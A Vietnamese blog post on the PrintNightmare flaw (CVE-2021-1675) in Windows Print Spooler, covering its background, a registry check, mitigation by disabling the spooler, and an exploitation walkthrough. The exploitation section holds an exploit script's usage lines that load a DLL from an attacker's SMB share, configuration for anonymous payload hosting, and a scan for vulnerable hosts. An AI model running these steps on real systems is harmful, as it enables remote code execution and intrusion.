---
title: Lỗi CVE-2021-1675
date: 22/7/2021
layout: single
header:
  teaser: /assets/images/cve.PNG
---

## Mô tả 
Microsoft một lần nữa đã cảnh báo người dùng của mình nên vô hiệu hóa service của Windows Print Spooler, sau khi một lỗ hổng mới được phát hiện cho phép hacker có thể cài và thực thi mã độc, virus lên bất cứ PC chạy Windows 10 nào. Mặc dù bản vá sửa lỗi sẽ được Microsoft phát hành sớm nhất có thể, nhưng gã khổng lồ công nghệ khuyến cáo rằng giải pháp hiệu quả nhất hiện nay là vô hiệu hóa hoàn toàn service của Windows Print Spooler.

Đây là lỗ hổng Windows Print Spooler thứ 3 được phát triển chỉ sau năm tuần. Trong khi một lỗ hổng nghiêm trọng khác liên quan đến Windows Print Spooler được xác định và sau đó được Microsoft vá lỗi vào tháng 6 thì gần đây lại xuất hiện một lỗ hổng tương tự mang tên PrintNightmare cũng được Microsoft vá lỗi trong bản cập nhật Windows 10 mới đây. Sự xuất hiện của lỗ hổng mới này là một sự thất vọng của người dùng Windows 10 đối với Microsoft.

Việc triển khai Impacket của PrintNightmare PoC ban đầu được tạo bởi Zhiniang Peng (@edwardzpeng) & Xuefeng Li (@ lxf02942370)

Thực thi DLL từ xa

![](https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/Images/poc2.png)


## Cập nhật bản vá 

Microsoft đã phát hành một bản vá để giảm thiểu các cuộc tấn công này nhưng nếu các giá trị dưới đây xuất hiện trên máy thì máy vẫn dễ bị tấn công

```powershell
REG QUERY "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint
    RestrictDriverInstallationToAdministrators    REG_DWORD    0x0
    NoWarningNoElevationOnInstall    REG_DWORD    0x1
```

## Khai thác 

Trước khi chạy khai thác, bạn cần cài đặt phiên bản Impacket
[![Language](https://img.shields.io/badge/Lang-python-blue.svg)](https://www.python.org)

```powershell
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install

```


Mã Khai thác [CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)

```powershell
usage: CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share

CVE-2021-1675 implementation.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  share                 Path to DLL. Example '\\10.10.10.10\share\evil.dll'

optional arguments:
  -h, --help            show this help message and exit

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

connection:
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name
                        and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server

Example;
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'

```

Cấu hình MB Cách dễ nhất để lưu trữ tải trọng là sử dụng samba và sửa đổi `/etc/samba/smb.conf` để 
cho phép truy cập ẩn danh

```shell 
[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445

[smb]
    comment = Samba
    path = /tmp/
    guest ok = yes
    read only = no
    browsable = yes
    force user = smbuser

```
```powershell
mkdir C:\share
icacls C:\share\ /T /grant Anonymous` logon:r
icacls C:\share\ /T /grant Everyone:r
New-SmbShare -Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f
# Reboot
```
## Scanning 
Tác giả  sử dụng rpcdump.py từ impacket để quét các máy chủ tiềm ẩn dễ bị tấn công, nếu nó trả về một giá trị, nó có thể dễ bị tấn công

```powershell
rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol

```

## Hạn chế bị tấn công 
Tắt dịch vụ Bộ đệm
```powershell
Stop-Service Spooler
REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWORD /d "4" /f

```

## Thanks 
